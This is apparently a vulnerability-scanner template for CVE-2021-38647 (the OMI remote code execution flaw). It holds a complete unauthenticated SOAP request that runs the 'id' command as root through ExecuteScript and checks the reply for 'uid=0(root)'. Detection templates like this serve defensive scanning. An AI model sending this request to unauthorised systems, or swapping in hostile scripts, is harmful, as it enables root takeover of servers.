cves/2021/CVE-2021-38647.yaml

id: CVE-2021-38647
info:
  name: Open Management Infrastructure Remote Code Execution Vulnerability
  tags: cve,cve2021,azure,omi
  author: elouhi
  severity: critical
  reference: https://attackerkb.com/topics/08O94gYdF1/cve-2021-38647
  description: Remote code execution

requests:
  - method: POST
    headers:
      Host: "{{Hostname}}"
      Content-Type: application/soap+xml
      Accept: '*/*'
    path:
      - "{{BaseURL}}/wsman/"
    body: >-
        <?xml version="1.0" encoding="UTF-8"?>
          <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
             <s:Header>
                <a:To>HTTP://{{Hostname}}/wsman/</a:To>
                <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
                <a:ReplyTo>
                   <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                </a:ReplyTo>
                <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action>
                <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
                <a:MessageID>uuid:00B60932-CC01-0005-0000-000000010000</a:MessageID>
                <w:OperationTimeout>PT1M30S</w:OperationTimeout>
                <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
                <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
                <w:OptionSet s:mustUnderstand="true" />
                <w:SelectorSet>
                   <w:Selector Name="__cimnamespace">root/scx</w:Selector>
                </w:SelectorSet>
             </s:Header>
             <s:Body>
                <p:ExecuteScript_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
                   <p:Script>aWQ=</p:Script>
                   <p:Arguments />
                   <p:timeout>0</p:timeout>
                   <p:b64encoded>true</p:b64encoded>
                </p:ExecuteScript_INPUT>
             </s:Body>
          </s:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uid=0(root)"
        part: body

      - type: status
        status:
          - 200